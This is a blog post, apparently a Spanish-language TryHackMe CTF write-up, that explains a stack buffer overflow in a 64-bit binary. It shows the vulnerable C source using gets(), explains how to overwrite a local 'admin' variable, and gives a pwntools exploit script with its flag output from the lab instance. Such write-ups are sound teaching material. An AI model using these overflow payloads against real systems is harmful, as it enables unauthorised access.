@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <title>
+TryOverflowMe 2 | abund4nt
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="64-bit binary, Buffer Overflow, overwrite local variables.">
+
+<meta name="generator" content="Hugo 0.123.7">
+
+
+<link rel="canonical" href="https://abund4nt.github.io/writeups/tryhackme/trypwnme-one/tryoverflowme2/" >
+
+
+
+
+<link href="/css/style.min.e22e1ef80ea19d08625444757176e07586bc5f332072f7ec355fae587dea40c9.css" rel="stylesheet">
+
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div>
+            <a class="terminal" href="https://abund4nt.github.io/">
+                <span>abund4nt@tryharder ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu">
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="https://abund4nt.github.io/about" title="" >
+                        ~/about</a>
+                </li>
+                
+                <li>
+                    <a href="https://abund4nt.github.io/posts" title="" >
+                        ~/posts</a>
+                </li>
+                
+                <li>
+                    <a href="https://abund4nt.github.io/writeups" title="" >
+                        ~/writeups</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>TryOverflowMe 2</h1>
+    
+    	<p>64-bit binary, Buffer Overflow, overwrite local variables.</p>
+    
+    
+    <section class="postMetadata">
+        <dl>
+            
+                
+<dt>tags</dt>
+<dd><span></span>
+    <a href="/tags/pwn/">#Pwn</a></dd>
+            
+            
+            
+            
+                <dt>published</dt>
+                
+                <dd><time datetime="2024-09-11">September 11, 2024</time></dd>
+            
+            
+                <dt>reading time</dt>
+                <dd>2 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    <div>
+        <p>Se nos proporciona un binario, el codigo fuente y una instancia remota para conectarnos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">read_flag</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag.txt&#34;</span>;
+</span></span><span style="display:flex;"><span>        FILE<span style="color:#f92672">*</span> file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(filename, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>file){
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;the file flag.txt is not in the current directory, please contact support</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> ch;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ((ch <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgetc</span>(file)) <span style="color:#f92672">!=</span> EOF) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">putchar</span>(ch);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>(file);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setup</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">banner</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> admin <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> guess <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> check <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Please Go ahead and leave a comment :&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gets</span>(buf);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (admin<span style="color:#f92672">==</span><span style="color:#ae81ff">0x59595959</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">read_flag</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Bye bye</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>El binario cuenta con las siguientes protecciones.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>Stack:    No canary found
+</span></span><span style="display:flex;"><span>NX:       NX enabled
+</span></span><span style="display:flex;"><span>PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="analisis-del-codigo-fuente">Analisis del codigo fuente</h2>
+<p>En la funcion <code>main()</code> define un bufer de 64 bits y luego toma nuestro output utilizando la funcion <code>gets()</code>, como sabemos esta funcion es insegura y no se recomienda su uso por que no limita el numero de caracteres que lee, lo que en la mayoria de veces produce desbordamientos de bufer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Please Go ahead and leave a comment :&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">gets</span>(buf);
+</span></span></code></pre></div><p>Luego define un condicional if que comprueba si la variable <code>admin</code> tiene la direccion de memoeria <code>0x59595959</code>, si esto es así nos muestra la flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (admin<span style="color:#f92672">==</span><span style="color:#ae81ff">0x59595959</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read_flag</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>La funcion <code>read_flag()</code> se encarga de abrir un archivo <code>flag.txt</code> y mostrarlo por pantalla. Para resolver este desafio debemos explotar una vulnerabilidad de Buffer Overflow y asignarle el valor <code>0x59595959</code> a la variable <code>admin</code> para leer la flag.</p>
+<h2 id="solucion">Solucion</h2>
+<p>Para resolver el desafio vamos a llenar el Bufer y enviar el valor <code>0x59595959</code> para obtener la flag, con el siguiente script resolvemos el desafio.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_process</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;Usage: python3 script.py &lt;ip:port&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    host, port <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> remote(host, int(port))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x59595959</span>) <span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> get_process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Please go ahead and leave a comment :</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(r<span style="color:#f92672">.</span>recv())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>Recomiendo leer sobre <a href="https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment">stack alignment</a> para enteder por que se enviaron 72 bytes en ves de 64 y se mutliplico la direccion de memoria por dos</p>
+<h2 id="flag">Flag</h2>
+<p>Al ejecutar el script obtendremos la flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 solve-remote.py 10.10.142.197:9004
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 10.10.142.197 on port 9004: Done
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;THM{why_just_the_A_have_a&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to 10.10.142.197 port <span style="color:#ae81ff">9004</span>
+</span></span></code></pre></div>
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+    
+</footer>
+    </div>
+
+    
+
+</body>
+
+</html>
